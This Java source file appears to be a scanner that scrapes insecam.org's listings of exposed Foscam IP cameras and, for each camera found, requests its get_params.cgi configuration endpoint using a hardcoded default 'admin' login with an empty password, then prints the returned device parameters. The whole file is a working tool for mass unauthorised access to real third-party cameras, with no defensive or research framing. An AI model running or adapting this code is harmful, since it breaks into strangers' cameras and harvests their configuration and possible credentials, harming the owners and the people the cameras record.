/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jhammer;


import java.io.IOException;
import java.util.StringTokenizer;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
/**
 *
 * @author Aditya
 */
public class JHammer1 {

    /**
     * @param args the command line arguments
     */
    static int i=1;
    public static void main(String[] args) throws IOException 
    {
        for(i=1;i<122;i++){
        Document doc=Jsoup.connect("http://www.insecam.org/en/bytype/Foscam/?page="+i).get();
       
        String g=doc.html();
        Document doc2=Jsoup.parse(g);
        Elements link=doc2.getElementsByTag("img");
        for(Element e : link)
        {
            try
            {
                String g1=e.attr("src");
                System.out.println(g1);
                int s=g1.indexOf("/",7);
                String g2=g1.substring(0,s+1)+"get_params.cgi";
                System.out.println(g2);
                Document doc3=Jsoup.connect(g2).header("Authorization","Basic "+"YWRtaW46").get();
                Element elem=doc3.body();
                String g10=elem.text();
                StringTokenizer st=new StringTokenizer(g10,";");
                while(st.hasMoreElements())
                {
                    System.out.println(st.nextToken());
                }
            }
            catch(org.jsoup.HttpStatusException e1)
            {
                 System.out.println("Failed");
            }
        }
    }}
    
}
